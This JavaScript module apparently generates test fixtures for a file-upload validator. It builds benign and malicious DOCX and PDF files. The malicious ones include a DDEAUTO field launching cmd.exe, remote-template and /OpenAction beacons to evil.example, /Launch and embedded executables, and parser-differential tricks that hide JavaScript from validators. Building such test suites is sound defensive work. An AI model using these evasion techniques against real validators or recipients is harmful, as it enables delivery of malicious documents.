// Generadores de archivos PAT benignos y maliciosos (sin binarios en Git). Fuente única para la
// suite de ataque (TypeScript, tipos en archivos-maliciosos.d.mts) y para scripts/attack-probes.mjs,
// por eso es JavaScript plano sin dependencias.
// Los DOCX son ZIP sin compresión (método 0) con la estructura mínima que exige el validador.
import { deflateSync } from 'node:zlib';

const CRC_TABLE = Array.from({ length: 256 }, (_, n) => {
  let c = n;
  for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  return c >>> 0;
});

/** @param {Buffer} data */
function crc32(data) {
  let crc = 0xffffffff;
  for (const byte of data) crc = CRC_TABLE[(crc ^ byte) & 0xff] ^ (crc >>> 8);
  return (crc ^ 0xffffffff) >>> 0;
}

/**
 * ZIP mínimo sin compresión con las entradas indicadas.
 * @param {Record<string, string | Buffer>} entries
 * @returns {Buffer}
 */
export function zipStored(entries) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const [name, content] of Object.entries(entries)) {
    const data = Buffer.isBuffer(content) ? content : Buffer.from(content, 'utf8');
    const fileName = Buffer.from(name, 'utf8');
    const crc = crc32(data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(0, 6); local.writeUInt16LE(0, 8);
    local.writeUInt32LE(0, 10); local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(fileName.length, 26); local.writeUInt16LE(0, 28);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6); central.writeUInt16LE(0, 8);
    central.writeUInt16LE(0, 10); central.writeUInt32LE(0, 12); central.writeUInt32LE(crc, 16); central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(data.length, 24); central.writeUInt16LE(fileName.length, 28); central.writeUInt32LE(offset, 42);
    locals.push(local, fileName, data);
    centrals.push(central, fileName);
    offset += local.length + fileName.length + data.length;
  }
  const directory = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  const count = Object.keys(entries).length;
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(count, 8); end.writeUInt16LE(count, 10);
  end.writeUInt32LE(directory.length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, directory, end]);
}

const CONTENT_TYPES = '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
  + '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/>'
  + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>';
const ROOT_RELS = '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
  + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>';
const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
/** @param {string} body */
const documentXml = (body) => `<?xml version="1.0" encoding="UTF-8"?><w:document ${W}><w:body>${body}</w:body></w:document>`;
const PARAGRAPH = '<w:p><w:r><w:t>Plan de Actividades de Titulación</w:t></w:r></w:p>';

export function docxBenigno() {
  return zipStored({ '[Content_Types].xml': CONTENT_TYPES, '_rels/.rels': ROOT_RELS, 'word/document.xml': documentXml(PARAGRAPH) });
}

/** Relación externa (inyección de plantilla remota / beacon). */
export function docxRelacionExterna() {
  return zipStored({
    '[Content_Types].xml': CONTENT_TYPES, '_rels/.rels': ROOT_RELS, 'word/document.xml': documentXml(PARAGRAPH),
    'word/_rels/document.xml.rels': '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
      + '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/plantilla.dotm" TargetMode="External"/></Relationships>',
  });
}

/** Objeto OLE incrustado. */
export function docxOleIncrustado() {
  return zipStored({
    '[Content_Types].xml': CONTENT_TYPES, '_rels/.rels': ROOT_RELS, 'word/document.xml': documentXml(PARAGRAPH),
    'word/embeddings/oleObject1.bin': Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0, 0, 0, 0]),
  });
}

/** Campo DDEAUTO que ejecuta un comando al abrir. */
export function docxDdeauto() {
  const field = '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>';
  return zipStored({ '[Content_Types].xml': CONTENT_TYPES, '_rels/.rels': ROOT_RELS, 'word/document.xml': documentXml(PARAGRAPH + field) });
}

/**
 * [VAL-003] Referencia numérica de carácter fuera del rango Unicode en una instrucción de campo.
 * @param {string} [referencia]
 */
export function docxEntidadFueraDeRango(referencia = '&#x110000;') {
  const field = `<w:p><w:r><w:instrText xml:space="preserve"> PAGE ${referencia} </w:instrText></w:r></w:p>`;
  return zipStored({ '[Content_Types].xml': CONTENT_TYPES, '_rels/.rels': ROOT_RELS, 'word/document.xml': documentXml(PARAGRAPH + field) });
}

/**
 * @param {string} extraCatalog
 * @param {string} [extraObjects]
 */
function pdf(extraCatalog, extraObjects = '') {
  return Buffer.from([
    '%PDF-1.4',
    `1 0 obj << /Type /Catalog /Pages 2 0 R ${extraCatalog} >> endobj`,
    '2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj',
    '3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj',
    extraObjects,
    'trailer << /Root 1 0 R >>',
    '%%EOF',
    '',
  ].join('\n'), 'latin1');
}

export const pdfBenigno = () => pdf('');
export const pdfJavaScript = () => pdf('/Names << /JavaScript << /Names [(x) 4 0 R] >> >>', '4 0 obj << /S /JavaScript /JS (app.alert\\(1\\)) >> endobj');
export const pdfOpenAction = () => pdf('/OpenAction 4 0 R', '4 0 obj << /S /URI /URI (http://evil.example/beacon) >> endobj');
export const pdfLaunch = () => pdf('/OpenAction 4 0 R', '4 0 obj << /S /Launch /F (cmd.exe) >> endobj');
export const pdfEmbeddedFile = () => pdf('/Names << /EmbeddedFiles << /Names [(a.exe) 4 0 R] >> >>', '4 0 obj << /Type /Filespec /F (a.exe) /EF << /F 5 0 R >> >> endobj\n5 0 obj << /Type /EmbeddedFile /Length 2 >> stream\nMZ\nendstream endobj');

/**
 * PDF con un stream de objetos (/ObjStm) comprimido, como los que generan LaTeX y los conversores actuales.
 * @param {string} objetos
 * @param {string} [diccionarioExtra]
 */
function pdfConObjStm(objetos, diccionarioExtra = '') {
  const datos = deflateSync(Buffer.from(objetos, 'latin1'));
  return Buffer.concat([
    Buffer.from('%PDF-1.7\n1 0 obj\n<</Type/Catalog/Pages 2 0 R/OpenAction[3 0 R/Fit]>>\nendobj\n', 'latin1'),
    Buffer.from(`5 0 obj\n<</Type/ObjStm/N 2/First 10${diccionarioExtra}/Filter/FlateDecode/Length ${datos.length}>>\nstream\n`, 'latin1'),
    datos, Buffer.from('\nendstream\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF\n', 'latin1'),
  ]);
}
const OBJETOS_PAGINA = '2 0 3 50 <</Type/Pages/Kids[3 0 R]/Count 1>>\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>';

export const pdfObjStmBenigno = () => pdfConObjStm(OBJETOS_PAGINA);

/*
 * Ensamblador de PDF con tabla de referencias coherente, para que un lector real resuelva los
 * objetos ocultos. `piezas` son cadenas (latin1), Buffers o marcas: `{ objeto: n }` registra el
 * desplazamiento de la siguiente pieza como el del objeto n; `{ comprimido: n, en: m, indice: i }`
 * declara que el objeto n vive en el stream de objetos m. Con `xref: 'stream'` la tabla es un
 * stream de referencias sin filtro (obligatorio si hay objetos comprimidos).
 */

/** @typedef {string | Buffer | { objeto: number } | { comprimido: number; en: number; indice: number }} PiezaPdf */

/** @param {PiezaPdf} pieza */
const esMarca = (pieza) => typeof pieza === 'object' && !Buffer.isBuffer(pieza);

/** @param {PiezaPdf[]} piezas */
function bytesDe(piezas) {
  let total = 0;
  for (const pieza of piezas) if (!esMarca(pieza)) total += Buffer.byteLength(/** @type {string | Buffer} */ (pieza), 'latin1');
  return total;
}

/**
 * @param {PiezaPdf[]} piezas
 * @param {{ raiz?: number; xref?: 'tabla' | 'stream'; trailerExtra?: string; base?: number }} [opciones]
 */
export function ensamblarPdf(piezas, { raiz = 1, xref = 'tabla', trailerExtra = '', base = 0 } = {}) {
  /** @type {Buffer[]} */
  const buffers = [];
  /** @type {Map<number, [number, number, number]>} */
  const entradas = new Map();
  let desplazamiento = base;
  for (const pieza of piezas) {
    if (esMarca(pieza)) {
      const marca = /** @type {{ objeto?: number; comprimido?: number; en?: number; indice?: number }} */ (pieza);
      if (marca.objeto !== undefined) entradas.set(marca.objeto, [1, desplazamiento, 0]);
      else entradas.set(/** @type {number} */ (marca.comprimido), [2, /** @type {number} */ (marca.en), /** @type {number} */ (marca.indice)]);
      continue;
    }
    const buffer = Buffer.isBuffer(pieza) ? pieza : Buffer.from(/** @type {string} */ (pieza), 'latin1');
    buffers.push(buffer);
    desplazamiento += buffer.length;
  }
  const inicioXref = desplazamiento;
  if (xref === 'tabla') {
    // Una subsección por cada tramo de objetos presentes (como en una actualización incremental).
    const numeros = [...entradas.keys()].sort((a, b) => a - b);
    const size = Math.max(0, ...numeros) + 1;
    let tabla = 'xref\n0 1\n0000000000 65535 f \n';
    for (let i = 0; i < numeros.length;) {
      let fin = i;
      while (fin + 1 < numeros.length && numeros[fin + 1] === numeros[fin] + 1) fin += 1;
      tabla += `${numeros[i]} ${fin - i + 1}\n`;
      for (let k = i; k <= fin; k += 1) tabla += `${String(entradas.get(numeros[k])?.[1]).padStart(10, '0')} 00000 n \n`;
      i = fin + 1;
    }
    tabla += `trailer\n<< /Size ${size} /Root ${raiz} 0 R${trailerExtra} >>\nstartxref\n${inicioXref}\n%%EOF\n`;
    buffers.push(Buffer.from(tabla, 'latin1'));
    return Buffer.concat(buffers);
  }
  const propio = Math.max(0, ...entradas.keys()) + 1;
  entradas.set(propio, [1, inicioXref, 0]);
  const size = propio + 1;
  const filas = Buffer.alloc(size * 7);
  for (let n = 0; n < size; n += 1) {
    const [tipo, campo2, campo3] = entradas.get(n) ?? [0, 0, n === 0 ? 0xffff : 0];
    filas.writeUInt8(tipo, n * 7); filas.writeUInt32BE(campo2, n * 7 + 1); filas.writeUInt16BE(campo3, n * 7 + 5);
  }
  buffers.push(
    Buffer.from(`${propio} 0 obj\n<< /Type /XRef /Size ${size} /W [1 4 2] /Root ${raiz} 0 R${trailerExtra} /Length ${filas.length} >>\nstream\n`, 'latin1'),
    filas, Buffer.from(`\nendstream\nendobj\nstartxref\n${inicioXref}\n%%EOF\n`, 'latin1'),
  );
  return Buffer.concat(buffers);
}

/**
 * Stream de objetos comprimido con FlateDecode. `diccionario` reemplaza a `/Type /ObjStm` (por
 * ejemplo, vacío para omitir /Type). `abierto` son las piezas hasta el final de los datos y
 * `cierre` el `endstream`, para poder medir tramos que terminan dentro del objeto.
 * @param {number} numero
 * @param {Array<[number, string]>} objetos
 * @param {string} [diccionario]
 */
export function streamDeObjetos(numero, objetos, diccionario = '/Type /ObjStm') {
  let cabecera = '';
  let cuerpo = '';
  for (const [n, texto] of objetos) { cabecera += `${n} ${cuerpo.length} `; cuerpo += `${texto}\n`; }
  const datos = deflateSync(Buffer.from(cabecera + cuerpo, 'latin1'));
  /** @type {PiezaPdf[]} */
  const abierto = [
    ...objetos.map(([n], indice) => ({ comprimido: n, en: numero, indice })),
    { objeto: numero },
    `${numero} 0 obj\n<< ${diccionario} /N ${objetos.length} /First ${cabecera.length} /Filter /FlateDecode /Length ${datos.length} >>\nstream\n`,
    datos,
  ];
  return { abierto, cierre: '\nendstream\nendobj\n' };
}

/**
 * Cabecera, catálogo, árbol de páginas y una página; `catalogoExtra` se añade al catálogo.
 * @returns {PiezaPdf[]}
 */
const piezasBase = (catalogoExtra = '') => [
  '%PDF-1.7\n%\xe2\xe3\xcf\xd3\n', { objeto: 1 }, `1 0 obj\n<< /Type /Catalog /Pages 2 0 R${catalogoExtra} >>\nendobj\n`,
  { objeto: 2 }, '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n',
  { objeto: 3 }, '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n',
];
const JS_NOMBRES = '<< /JavaScript << /Names [(x) 9 0 R] >> >>';
const JS_ACCION = '<< /S /JavaScript /JS (app.alert\\(1\\)) >>';
const BEACON = '9 0 obj\n<< /S /URI /URI (http://evil.example/beacon) >>\nendobj\n';
const fijo = (/** @type {number} */ n) => String(n).padStart(8, '0');

/**
 * [VAL-001] El stream 4 declara `/Length 5 0 R`. Sus datos contienen un `endstream` falso seguido
 * de `6 0 obj << /Length N >> stream`, con N elegido para que, desde el final real de los datos,
 * termine en el `endstream` real de un /ObjStm posterior. Quien corte en el primer `endstream`
 * se traga el /ObjStm (con el árbol /JavaScript del catálogo); un lector real lo resuelve por xref.
 */
export function pdfLongitudIndirectaEndstreamFalso() {
  const oculto = streamDeObjetos(7, [[8, JS_NOMBRES], [9, JS_ACCION]]);
  const datosA = (/** @type {number} */ n) => `Datos de la figura 1.\nendstream\nendobj\n6 0 obj\n<< /Length ${fijo(n)} >>\nstream\n`;
  const longitudA = datosA(0).length;
  const tragado = ['\nendstream\nendobj\n', { objeto: 5 }, `5 0 obj\n${fijo(longitudA)}\nendobj\n`, ...oculto.abierto];
  return ensamblarPdf([
    ...piezasBase(' /Names 8 0 R'),
    { objeto: 4 }, '4 0 obj\n<< /Length 5 0 R >>\nstream\n', datosA(bytesDe(tragado)), ...tragado, oculto.cierre,
  ], { xref: 'stream' });
}

/**
 * [VAL-002] Stream de objetos sin `/Type /ObjStm` (los lectores solo usan /N y /First) o con
 * `/Type` indirecto, que contiene el árbol /JavaScript del catálogo.
 * @param {'sin-type' | 'type-indirecto'} variante
 */
export function pdfObjStmSinType(variante = 'sin-type') {
  const diccionario = variante === 'sin-type' ? '' : '/Type 10 0 R';
  const oculto = streamDeObjetos(7, [[8, JS_NOMBRES], [9, JS_ACCION]], diccionario);
  return ensamblarPdf([
    ...piezasBase(' /Names 8 0 R'), ...oculto.abierto, oculto.cierre,
    { objeto: 10 }, '10 0 obj\n/ObjStm\nendobj\n',
  ], { xref: 'stream' });
}

/**
 * Objeto sin comprimir escondido donde el validador no busca estructura; la xref apunta a él.
 * `donde`: datos de un stream, una cadena literal o un comentario. `cabecera` permite escribir la
 * cabecera con comentarios o espacios inusuales entre sus tokens.
 * @param {{ donde?: 'stream' | 'cadena' | 'comentario'; accion?: 'openaction' | 'aa'; cabecera?: string }} [opciones]
 */
export function pdfObjetoOculto({ donde = 'stream', accion = 'openaction', cabecera = '8 0 obj' } = {}) {
  const cuerpo = accion === 'openaction'
    ? '<< /Type /Catalog /Pages 2 0 R /OpenAction 9 0 R >>'
    : '<< /Type /Catalog /Pages 2 0 R /AA << /O 9 0 R >> >>';
  const texto = `${cabecera}\n${cuerpo}\nendobj\n`;
  /** @type {PiezaPdf[]} */
  let contenedor;
  if (donde === 'stream') contenedor = [`4 0 obj\n<< /Length ${texto.length} >>\nstream\n`, { objeto: 8 }, texto, '\nendstream\nendobj\n'];
  else if (donde === 'cadena') contenedor = ['4 0 obj\n(', { objeto: 8 }, texto, ')\nendobj\n'];
  else contenedor = ['4 0 obj\nnull\nendobj\n%', { objeto: 8 }, texto.replaceAll('\n', ' '), '\n'];
  return ensamblarPdf([...piezasBase(), ...contenedor, { objeto: 9 }, BEACON], { raiz: 8 });
}

/** Stream con `/Length` directo que no termina en `endstream`; el `endstream` real está más adelante. */
export function pdfLongitudDirectaInexacta() {
  return ensamblarPdf([...piezasBase(), { objeto: 4 }, '4 0 obj\n<< /Length 5 >>\nstream\nabcdefghij\nendstream\nendobj\n']);
}

/**
 * Stream con `/Length 5 0 R` cuyo objeto 5 falta, no es un entero o está definido dos veces.
 * @param {'falta' | 'no-entero' | 'negativo' | 'referencia' | 'duplicado-distinto' | 'duplicado-igual' | 'correcto'} caso
 */
export function pdfLongitudIndirecta(caso) {
  const datos = 'BT /F1 12 Tf 72 712 Td (Plan de titulacion) Tj ET';
  const stream = [{ objeto: 4 }, `4 0 obj\n<< /Length 5 0 R >>\nstream\n${datos}\nendstream\nendobj\n`];
  /** @type {Record<string, PiezaPdf[]>} */
  const longitud = {
    falta: [],
    'no-entero': [{ objeto: 5 }, '5 0 obj\n(49)\nendobj\n'],
    negativo: [{ objeto: 5 }, `5 0 obj\n-${datos.length}\nendobj\n`],
    referencia: [{ objeto: 5 }, '5 0 obj\n6 0 R\nendobj\n', { objeto: 6 }, `6 0 obj\n${datos.length}\nendobj\n`],
    'duplicado-distinto': [{ objeto: 5 }, `5 0 obj\n${datos.length}\nendobj\n5 0 obj\n${datos.length + 7}\nendobj\n`],
    'duplicado-igual': [{ objeto: 5 }, `5 0 obj\n${datos.length}\nendobj\n5 0 obj ${datos.length} endobj\n`],
    correcto: [{ objeto: 5 }, `5 0 obj\n${datos.length}\nendobj\n`],
  };
  return ensamblarPdf([...piezasBase(), ...stream, ...longitud[caso]]);
}

/** PDF 1.5 benigno: stream de referencias, streams de objetos y contenido comprimido. */
export function pdfModernoBenigno() {
  const contenido = deflateSync(Buffer.from('BT /F1 12 Tf 72 712 Td (Plan de titulacion) Tj ET', 'latin1'));
  const objetos = streamDeObjetos(6, [
    [2, '<< /Type /Pages /Kids [3 0 R] /Count 1 >>'],
    [3, '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> /Annots [<< /Type /Annot /Subtype /Link /Rect [72 700 200 720] /A << /S /URI /URI (https://uleam.edu.ec) >> >>] >>'],
    [5, '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>'],
  ]);
  return ensamblarPdf([
    '%PDF-1.7\n%\xe2\xe3\xcf\xd3\n', { objeto: 1 }, '1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >>\nendobj\n',
    { objeto: 4 }, `4 0 obj\n<< /Filter /FlateDecode /Length ${contenido.length} >>\nstream\r\n`, contenido, '\r\nendstream\nendobj\n',
    ...objetos.abierto, objetos.cierre,
  ], { xref: 'stream' });
}

/** PDF benigno con una actualización incremental añadida tras el primer `%%EOF`. */
export function pdfActualizacionIncremental() {
  const original = ensamblarPdf(piezasBase());
  const startxref = Number(/startxref\n(\d+)/.exec(original.toString('latin1'))?.[1]);
  const contenido = 'BT /F1 11 Tf 72 760 Td (Version 2) Tj ET';
  const actualizacion = ensamblarPdf([
    { objeto: 3 }, '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>\nendobj\n',
    { objeto: 4 }, `4 0 obj\n<< /Length 5 0 R >>\nstream\n${contenido}\nendstream\nendobj\n`,
    { objeto: 5 }, `5 0 obj\n${contenido.length}\nendobj\n`,
  ], { base: original.length, trailerExtra: ` /Prev ${startxref}` });
  return Buffer.concat([original, actualizacion]);
}

/**
 * Disposición linealizada simplificada: diccionario /Linearized como primer objeto, sección xref
 * de la primera página al inicio, stream de pistas y la xref principal al final.
 */
export function pdfLinealizado() {
  const pistas = deflateSync(Buffer.alloc(36, 1));
  const primera = [
    '%PDF-1.7\n%\xe2\xe3\xcf\xd3\n', { objeto: 10 }, '10 0 obj\n<< /Linearized 1 /L 2048 /H [ 600 120 ] /O 12 /E 900 /N 1 /T 1500 >>\nendobj\n',
    'xref\n10 4\n0000000000 00000 n \n0000000000 00000 n \n0000000000 00000 n \n0000000000 00000 n \ntrailer\n<< /Size 14 /Prev 1500 /Root 11 0 R >>\nstartxref\n0\n%%EOF\n',
    { objeto: 11 }, '11 0 obj\n<< /Type /Catalog /Pages 1 0 R >>\nendobj\n',
    { objeto: 13 }, `13 0 obj\n<< /S 36 /Filter /FlateDecode /Length ${pistas.length} >>\nstream\n`, pistas, '\nendstream\nendobj\n',
    { objeto: 12 }, '12 0 obj\n<< /Type /Page /Parent 1 0 R /MediaBox [0 0 612 792] >>\nendobj\n',
    { objeto: 1 }, '1 0 obj\n<< /Type /Pages /Kids [12 0 R] /Count 1 >>\nendobj\n',
  ];
  return ensamblarPdf(primera, { raiz: 11 });
}

/** Cabecera de objeto con comentarios y espacios entre sus tokens, en el nivel superior (válida). */
export function pdfCabeceraConComentarios() {
  return ensamblarPdf([...piezasBase(), { objeto: 7 }, '7 %comentario\n 0\t\f%otro\r\nobj\n<< /Producer (Prueba) >>\nendobj\n']);
}

/**
 * [V2-001] PDF cifrado con el manejador estándar y contraseña de usuario vacía (los lectores lo
 * abren sin pedirla). En un PDF cifrado las cadenas y los datos de los streams son texto cifrado, así
 * que un stream de objetos con un catálogo /OpenAction /JavaScript no se puede inspeccionar. No lleva
 * texto cifrado real: basta la clave /Encrypt para probar la regla. `donde`: trailer clásico, trailer
 * con el nombre escrito `/#45ncrypt`, o diccionario de un stream de referencias.
 * @param {'trailer' | 'hex' | 'xref-stream'} [donde]
 */
export function pdfCifrado(donde = 'trailer') {
  const clave = donde === 'hex' ? '/#45ncrypt' : '/Encrypt';
  const id = '<5f2b9c0e7a1d4c3b8e6f0a9d2c4b7e1f>';
  const diccionario = `9 0 obj\n<< /Filter /Standard /V 2 /R 3 /Length 128 /P -3904 /O <${'a1'.repeat(32)}> /U <${'b2'.repeat(32)}> >>\nendobj\n`;
  return ensamblarPdf([...piezasBase(), { objeto: 9 }, diccionario], {
    xref: donde === 'xref-stream' ? 'stream' : 'tabla', trailerExtra: ` ${clave} 9 0 R /ID [${id} ${id}]`,
  });
}

/**
 * [V2-002] Stream de objetos identificado solo por `/N` (sin /First ni /Type). Un lector que toma
 * /First como 0 lee los desplazamientos desde el inicio de los datos y carga el objeto 8 (raíz del
 * documento, comprimido según el stream de referencias): un catálogo con /OpenAction en línea.
 * @param {{ filtro?: 'flate' | 'ninguno'; accion?: 'javascript' | 'uri' }} [opciones]
 */
export function pdfObjStmSoloN({ filtro = 'flate', accion = 'javascript' } = {}) {
  const abrir = accion === 'javascript' ? JS_ACCION : '<< /S /URI /URI (http://evil.example/beacon) >>';
  const plano = Buffer.from(`8 4 << /Type /Catalog /Pages 2 0 R /OpenAction ${abrir} >>\n`, 'latin1');
  const datos = filtro === 'flate' ? deflateSync(plano) : plano;
  return ensamblarPdf([
    '%PDF-1.7\n%\xe2\xe3\xcf\xd3\n',
    { objeto: 2 }, '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n',
    { objeto: 3 }, '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n',
    { comprimido: 8, en: 7, indice: 0 }, { objeto: 7 },
    `7 0 obj\n<< /N 1${filtro === 'flate' ? ' /Filter /FlateDecode' : ''} /Length ${datos.length} >>\nstream\n`, datos, '\nendstream\nendobj\n',
  ], { xref: 'stream', raiz: 8 });
}

/**
 * Bytes binarios deterministas (generador congruencial) que hacen de perfil ICC de prueba.
 * @param {number} longitud
 */
function bytesPseudoaleatorios(longitud) {
  const bytes = Buffer.alloc(longitud);
  let semilla = 0x2545f491;
  for (let i = 0; i < longitud; i += 1) {
    semilla = (Math.imul(semilla, 1664525) + 1013904223) >>> 0;
    bytes[i] = semilla >>> 24;
  }
  return bytes;
}

/**
 * PDF benigno con un perfil ICC (`/N 3`, datos binarios) usado como espacio de color /ICCBased y
 * como intención de salida, como los que escriben Chromium, Word y pdfkit (PDF/A). `filtro`:
 * FlateDecode (lo habitual), sin filtro, o LZWDecode (que el validador no descomprime).
 * @param {{ perfil?: Buffer; filtro?: 'flate' | 'ninguno' | 'lzw' }} [opciones]
 */
export function pdfIccBasado({ perfil = bytesPseudoaleatorios(3144), filtro = 'flate' } = {}) {
  const datos = filtro === 'flate' ? deflateSync(perfil) : perfil;
  const filtroDic = { flate: ' /Filter /FlateDecode', ninguno: '', lzw: ' /Filter /LZWDecode' }[filtro];
  const contenido = deflateSync(Buffer.from('/CS0 cs 0.2 0.4 0.6 sc 72 72 200 100 re f', 'latin1'));
  return ensamblarPdf([
    '%PDF-1.7\n%\xe2\xe3\xcf\xd3\n',
    { objeto: 1 }, '1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OutputIntents [<< /Type /OutputIntent /S /GTS_PDFA1 /OutputConditionIdentifier (sRGB IEC61966-2.1) /DestOutputProfile 6 0 R >>] >>\nendobj\n',
    { objeto: 2 }, '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n',
    { objeto: 3 }, '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /ColorSpace << /CS0 [/ICCBased 6 0 R] >> >> >>\nendobj\n',
    { objeto: 4 }, `4 0 obj\n<< /Filter /FlateDecode /Length ${contenido.length} >>\nstream\n`, contenido, '\nendstream\nendobj\n',
    { objeto: 6 }, `6 0 obj\n<< /N 3 /Alternate /DeviceRGB${filtroDic} /Length ${datos.length} >>\nstream\n`, datos, '\nendstream\nendobj\n',
  ]);
}
/** /JavaScript oculto en un /ObjStm cuyo diccionario supera los 4096 caracteres. */
export const pdfObjStmJavaScriptRelleno = () => pdfConObjStm(`${OBJETOS_PAGINA}\n4 0 <</S/JavaScript/JS(app.alert\\(1\\))>>`, `/Relleno(${'x'.repeat(6000)})`);
export const pdfObjStmLaunch = () => pdfConObjStm(`${OBJETOS_PAGINA}\n4 0 <</S/Launch/F(cmd.exe)>>`);
export const pdfObjStmEmbeddedFile = () => pdfConObjStm(`${OBJETOS_PAGINA}\n4 0 <</Type/EmbeddedFile/Length 2>>`);
export const pdfObjStmRichMedia = () => pdfConObjStm(`${OBJETOS_PAGINA}\n4 0 <</Subtype/RichMedia>>`);

export const PDF_MIME = 'application/pdf';
export const DOCX_MIME = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document';

export const ARCHIVOS_MALICIOSOS = [
  { nombre: 'DOCX con relación TargetMode="External"', archivo: 'externo.docx', mime: DOCX_MIME, contenido: docxRelacionExterna },
  { nombre: 'DOCX con word/embeddings/ (OLE)', archivo: 'ole.docx', mime: DOCX_MIME, contenido: docxOleIncrustado },
  { nombre: 'DOCX con campo DDEAUTO', archivo: 'dde.docx', mime: DOCX_MIME, contenido: docxDdeauto },
  { nombre: 'PDF con /JavaScript', archivo: 'js.pdf', mime: PDF_MIME, contenido: pdfJavaScript },
  { nombre: 'PDF con /OpenAction', archivo: 'open.pdf', mime: PDF_MIME, contenido: pdfOpenAction },
  { nombre: 'PDF con /Launch', archivo: 'launch.pdf', mime: PDF_MIME, contenido: pdfLaunch },
  { nombre: 'PDF con /EmbeddedFile', archivo: 'embedded.pdf', mime: PDF_MIME, contenido: pdfEmbeddedFile },
  { nombre: 'PDF con /JavaScript en un /ObjStm de diccionario > 4096 caracteres', archivo: 'objstm-js.pdf', mime: PDF_MIME, contenido: pdfObjStmJavaScriptRelleno },
  { nombre: 'PDF con /Launch dentro de un /ObjStm', archivo: 'objstm-launch.pdf', mime: PDF_MIME, contenido: pdfObjStmLaunch },
  { nombre: 'PDF con /EmbeddedFile dentro de un /ObjStm', archivo: 'objstm-embedded.pdf', mime: PDF_MIME, contenido: pdfObjStmEmbeddedFile },
  { nombre: 'PDF con /RichMedia dentro de un /ObjStm', archivo: 'objstm-richmedia.pdf', mime: PDF_MIME, contenido: pdfObjStmRichMedia },
  // Diferencial lector/validador (VAL-001, VAL-002) y entidad XML fuera de rango (VAL-003): 400 exacto.
  { nombre: 'PDF con /ObjStm oculto tras un endstream falso y /Length indirecto', archivo: 'endstream-falso.pdf', mime: PDF_MIME, contenido: pdfLongitudIndirectaEndstreamFalso, estado: 400 },
  { nombre: 'PDF con stream de objetos sin /Type (solo /N y /First)', archivo: 'objstm-sin-type.pdf', mime: PDF_MIME, contenido: () => pdfObjStmSinType('sin-type'), estado: 400 },
  { nombre: 'PDF con catálogo /OpenAction escondido en los datos de un stream', archivo: 'objeto-oculto.pdf', mime: PDF_MIME, contenido: () => pdfObjetoOculto(), estado: 400 },
  { nombre: 'DOCX con referencia de carácter &#x110000; fuera de rango', archivo: 'entidad.docx', mime: DOCX_MIME, contenido: () => docxEntidadFueraDeRango(), estado: 400 },
  // PDF cifrado (V2-001) y stream de objetos identificado solo por /N (V2-002): 400 exacto.
  { nombre: 'PDF cifrado con contraseña de usuario vacía (/Encrypt en el trailer)', archivo: 'cifrado.pdf', mime: PDF_MIME, contenido: () => pdfCifrado('trailer'), estado: 400 },
  { nombre: 'PDF cifrado con /Encrypt en el diccionario de un stream de referencias', archivo: 'cifrado-xref.pdf', mime: PDF_MIME, contenido: () => pdfCifrado('xref-stream'), estado: 400 },
  { nombre: 'PDF con catálogo /OpenAction /JavaScript en un stream con solo /N', archivo: 'objstm-solo-n.pdf', mime: PDF_MIME, contenido: () => pdfObjStmSoloN(), estado: 400 },
];
